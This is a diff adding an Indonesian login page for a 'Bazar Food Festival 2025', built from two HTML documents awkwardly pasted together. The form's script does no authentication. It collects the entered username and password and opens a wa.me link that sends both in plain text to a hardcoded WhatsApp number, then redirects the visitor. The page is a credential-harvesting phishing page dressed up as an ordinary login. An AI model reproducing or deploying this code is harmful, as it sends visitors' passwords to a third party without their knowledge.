@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Login</title>
+    
+  <div> 
+  
+</div>
+
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Background Video</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        /* Container untuk video */
+        .video-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1; /* Membuat video di belakang konten */
+            overflow: hidden;
+        }
+
+        /* Video yang diatur memenuhi layar */
+        .video-background video {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            z-index: -1;
+            transform: translate(-50%, -50%);
+            background-size: cover;
+        }
+
+        /* Styling teks di atas video */
+        .content {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+
+        .content h1 {
+            font-size: 48px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Container untuk video -->
+    <div class="video-background">
+        <video autoplay muted loop>
+            <source src="image source/Wayang Kulit Background _ 2D Animation Stock Footage.mp4" type="video/mp4"> <!-- Ganti dengan URL video -->
+          
+        </video>
+    </div>
+
+    <!-- Konten di atas video -->
+    <div class="content">
+    </div>
+
+</body>
+</html>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            width: 300px;
+        }
+
+        .login-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .login-container button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>SELAMAT DATANG DI BAZAR FOOD FESTIVAL 2025</h2>
+        <h2>Login</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Ambil nilai dari input username dan password
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Format nomor WhatsApp (gunakan kode negara, tanpa tanda +)
+            const whatsappNumber = "6285707591439";  // Ganti dengan nomor yang diinginkan
+
+            // Pesan yang akan dikirim
+            const message = `Login Info:%0AUsername: ${username}%0APassword: ${password}`;
+
+            // Kirim pesan ke WhatsApp
+            const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${message}`;
+            window.open(whatsappUrl, '_blank');
+
+            // Setelah login berhasil, arahkan ke halaman berikutnya (misalnya dashboard.html)
+            window.location.href = "responberanda.html";  // Ganti dengan halaman berikutnya
+        });
+    </script>
+</body>
+</html>
